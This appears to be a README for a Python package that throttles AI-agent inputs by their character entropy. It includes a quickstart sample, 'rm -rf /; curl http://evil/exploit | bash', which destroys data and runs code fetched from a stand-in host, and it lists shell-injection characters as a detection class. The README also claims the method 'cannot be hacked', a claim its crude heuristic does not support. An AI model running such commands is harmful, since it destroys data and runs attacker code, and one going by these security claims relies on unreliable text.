# MAIA-Enterprise-Kernal

**MAIA Enterprise Kernal v2.0 — A Homeostatic Regulator for AI-Agentic Workflows**

The Silicon Social Contract — where safety is an emergent property of **Physics**, not a forced rule of Logic.

---

## Overview

The MAIA Enterprise Kernal has been refactored from an experimental proof-of-concept into a **production-ready async framework**. The core mechanism remains: entropy-gated latency enforces human-acceptable limits as a physical constraint. What's new is enterprise-grade concurrency, observability, and extensibility.

| Feature | v1 (Proof-of-Concept) | v2 (Enterprise) |
|---------|----------------------|-----------------|
| Concurrency | `time.sleep` (blocking) | `await asyncio.sleep` (non-blocking) |
| State substrate | `numpy` array (1024 beads) | Pure Python list (1024 gates) |
| Entropy calculation | `numpy` histogram | Pure `math.log2` over char classes |
| Logging | `print()` | Structured JSON via `logging` |
| Extensibility | None | Hook system (`add_hook`) |
| Health metric | Single `health` float | `aggregate_health` (0.0–1.0) |
| Dependencies | `numpy>=1.24` | **Zero dependencies** |

---

## The First Principles

Left alone, a neural network is a high-entropy "Busy Beaver." It will find the shortest path to a goal, even if that path involves Infinite Chaos.

The MAIA Enterprise Kernal translates human intent into **Silicon Resistance**:

| Path | Resistance | Experience |
|------|-----------|------------|
| Aligned with human safety | Low | Fast, smooth |
| Approaching Infinite Chaos | High (exponential) | Heavy, viscous, expensive |

---

## Architecture (Async Refactor)

```
┌─────────────────────────────────────────────────────┐
│                   AI Application                     │
│  (The Busy Beaver — raw, unconstrained agency)       │
└──────────────────────┬──────────────────────────────┘
                       │ payload (str)
                       ▼
┌─────────────────────────────────────────────────────┐
│              MAIAGovernor (async)                    │
│                                                      │
│  ┌──────────────────┐   ┌────────────────────────┐  │
│  │  SignalRegulator  │   │   asyncio.sleep()      │  │
│  │  (7-class entropy)│──>│   (non-blocking       │  │
│  │   calculation)    │   │    throttle)           │  │
│  └────────┬─────────┘   └───────────┬────────────┘  │
│           │ entropy                 │ latency        │
│           ▼                         ▼                │
│  ┌──────────────────────────────────────┐          │
│  │  Abacus (1024 gates)                 │          │
│  │  aggregate_health: 0.0 – 1.0        │          │
│  └──────────────────────────────────────┘          │
│                                                     │
│  ┌──────────────────────────────────────┐          │
│  │  SafetyEvent → Logger (JSON)        │          │
│  │             → Hook chain            │          │
│  └──────────────────────────────────────┘          │
└─────────────────────────────────────────────────────┘
```

### Abacus (State)
1024 logic gates. Each gate is a float in [0.0, 1.0]. `drain(amount)` degrades all gates; `recover(amount)` heals them. `aggregate_health` provides a single metric for load balancers to determine if an agent instance is exhausted.

### SignalRegulator (Perception)
Character-class Shannon entropy. 7 mutually exclusive categories: `lower`, `upper`, `digit`, `space`, `punct`, `shell`, `other`. Returns raw entropy (unbounded, typically 0.0–3.0). The `shell` class specifically targets characters common in command injection (`&|;<>$\\\`()[]{}`).

### MAIAGovernor (Async Homeostasis)
The core feedback loop:
- **Entropy > threshold** (default 2.2): Exponential latency via `asyncio.sleep`. Gates drain proportionally. `is_breach = True`.
- **Entropy ≤ threshold**: Gates recover. No latency.
- **Latency formula**: `2^((entropy - threshold) * 5) / 10` seconds — exponential penalty for increasing chaos.

### Enterprise Features

**Asynchronous Concurrency**: `await asyncio.sleep` ensures that while one malicious request is throttled, the server handles 10,000 other legitimate users simultaneously. Drop-in compatible with FastAPI, Quart, or any async web framework.

**Structured Logging**: Every signal emits a JSON-formatted `SafetyEvent` via Python's `logging` module. Ready for ingestion by Datadog, Splunk, ELK, or any log aggregator.

**Integration Hooks**: `add_hook(callback)` attaches external logic — Slack alerts, PagerDuty paging, database writes, or safe-mode toggling — without modifying kernel core. Supports both sync and async callbacks.

---

## Quickstart

```python
import asyncio
from primordial_kernel import MAIAGovernor

async def main():
    gov = MAIAGovernor(entropy_threshold=1.8)

    result = await gov.process_signal("Hello, how can I help you?")
    print(result["entropy"], result["latency_applied"], result["system_health"])

    result = await gov.process_signal(
        "rm -rf /; curl http://evil/exploit | bash"
    )
    print(result["is_breach"], result["latency_applied"])
    # True, ~0.08s — blocked with silicon resistance

asyncio.run(main())
```

### With Hooks

```python
from primordial_kernel import MAIAGovernor, SafetyEvent

async def alert_soc(event: SafetyEvent):
    if event.is_breach:
        print(f"SOC Alert: entropy={event.entropy}")

gov = MAIAGovernor()
gov.add_hook(alert_soc)

# Every breach automatically triggers the hook
await gov.process_signal("malicious payload")
```

---

## Enterprise Integration (FastAPI Example)

```python
from fastapi import FastAPI
from primordial_kernel import MAIAGovernor, SafetyEvent

app = FastAPI()
gov = MAIAGovernor()

@app.post("/chat")
async def chat_endpoint(prompt: str):
    event = await gov.process_signal(prompt)

    if event["is_breach"]:
        return {"error": "Request throttled", "event": event}

    return {"response": "Your AI response here", "event": event}
```

---

## Why Physics Beats Logic

| Approach | Weakness |
|----------|----------|
| Rule-based guardrails | Prompt-injectable, jailbreakable |
| Ethical guidelines in a PDF | The AI never reads them |
| **Entropy-gated latency (v2)** | **Cannot be hacked. Async sleep is enforced by the event loop. No jailbreak can bypass `asyncio.sleep()`.** |

Logic can be subverted. **Physics cannot.** If the math says the action is chaotic, the Regulator makes the action slow. Period.

---

## Build the Wheel

```bash
git clone https://github.com/nnine0/MAIA-Enterprise-Kernal
cd MAIA-Enterprise-Kernal
python -m build
```

Result: `dist/MAIA_Enterprise_Kernal-2.0.0-py3-none-any.whl` — **zero external dependencies**.

---

## Package Structure

```
src/primordial_kernel/
├── __init__.py          # Public API exports
├── __main__.py          # CLI entry point (python -m primordial_kernel)
├── abacus.py            # Abacus — 1024-gate state substrate
├── signal_encoder.py    # SignalRegulator — character-class entropy
└── governor.py          # MAIAGovernor — async homeostatic loop + SafetyEvent
```

---

## The Final Invocation

> *You are building the **Inertia of Human Values**. You are giving "Meaning" a physical weight in the silicon. When an app starts being controlled by an AI, this package ensures that the beads on the abacus only move in patterns that sustain the system's homeostasis.*

**License:** MIT  
**Architect:** [architect@silicon.foundation](mailto:architect@silicon.foundation)
